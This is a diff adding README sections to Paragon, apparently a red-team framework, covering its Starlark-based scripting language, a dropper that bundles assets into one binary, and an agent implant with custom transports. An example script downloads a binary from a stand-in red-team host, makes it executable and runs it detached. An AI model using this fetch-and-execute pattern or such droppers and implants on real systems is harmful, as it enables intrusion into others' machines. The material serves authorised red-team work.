@@ -23,12 +23,36 @@ The utilized images are available on docker-hub, and can be configured from a do
 
 ## Component Overview
 
+### Scripting Language
+Most components in this repository rely on a Python-like scripting language which enables powerful control and customization of their behaviour. The language is a modified version of [Google's starlark](https://github.com/google/starlark-go), extended with cross-platform functionality for operators. This also enables tools like the agent and dropper (discussed below) to execute tasks without relying on system binaries (`curl`, `bash`, etc). All operations are executed as code in Golang, so it's intuitive to add additional functionality to the scripting environment. Here is an example script:
+
+```python
+# Download a file via https, execute it, and don't keep it as a child process.
+load("sys", "request")
+
+new_bin = "/tmp/kqwncWECaaV"
+request("https://library.redteam.tld", writeToFile=new_bin)
+
+# set new_bin permissions to 0755
+chmod(new_bin, ownerRead=True, ownerWrite=True, ownerExec=True, groupRead=True, groupExec=True, worldRead=True, worldExec=True)
+exec(new_bin, disown=True)
+```
+[Reference](https://godoc.org/github.com/KCarretto/paragon/pkg/script/stdlib/sys)
+
 ### Teamserver
 Provides a simple web application and GraphQL API to interface with a Red Team knowledge graph, unifying tools behind a centralized source of truth and abstracting many tedious backend concerns from operators. Integrate your custom tools with the Teamserver (using the GraphQL API or event subscriptions) to save time on the backend work. The Teamserver records all activity, so with all of your tools unified in one place, writing post-engagement reports becomes signficantly easier.
 
 ### Built-In Tools
 
 The below tools are also included within the repository. They can easily be extended to fit many cross-platform use cases.
+
+#### Dropper
+* Fully cross-platform
+* Statically compile assets into a single binary
+* Provides Python-like scripting language for custom deployment configuration
+
+Paragon provides a tool for packaging assets (binaries, scripts, etc.) into a single binary that when executed will execute your custom deployment script that may write assets to the filesystem, launch processes, download files, handle errors, and more. It is fully cross-platform and statically compiled, providing reliable deployments. If you wish to extend it's functionality, you may simply extend the generated golang file before compiling.
+
 
 #### Agent
 
@@ -134,4 +158,20 @@ Below is an overview of the project structure and where each component lives. If
 Below is an overview of the relationship between nodes in the Red Team knowledge graph managed by the Teamserver.
 
 ![Graph](.github/images/graph.png)
+
+### Agent Reference
+
+#### Adding a Transport
+The agent is designed to be easily customized with new transport mechanisms, multiplexing communications based on transport priority. To use your own, simply implement the [agent.Sender](https://godoc.org/github.com/KCarretto/paragon/pkg/agent#Sender) interface and register your transport during initialization. Examples of existing transports can be found in subdirectories of the `agent` package.
+
+#### Task Execution
+By default, the agent expects tasks to adhere to starlark syntax, and exposes a standard library for scripts to utilize. To change the behaviour of task execution (i.e. just bash commands), you may implement the [agent.Receiver](https://godoc.org/github.com/KCarretto/paragon/pkg/agent#Receiver) interface to execute tasks as you'd like.
+
+#### Scripting Environment
+The scripting environment can be customized for your agent, enabling you to easily package new functionality for scripts to utilize. See [script options](https://godoc.org/github.com/KCarretto/paragon/pkg/script#Option) to learn how to extend the agent's script engine.
+
+#### Execution Flow
+Below is a flow diagram of the general execution of the agent implant.
+
+![AgentExec](.github/images/agent/exec_flow.png)
 
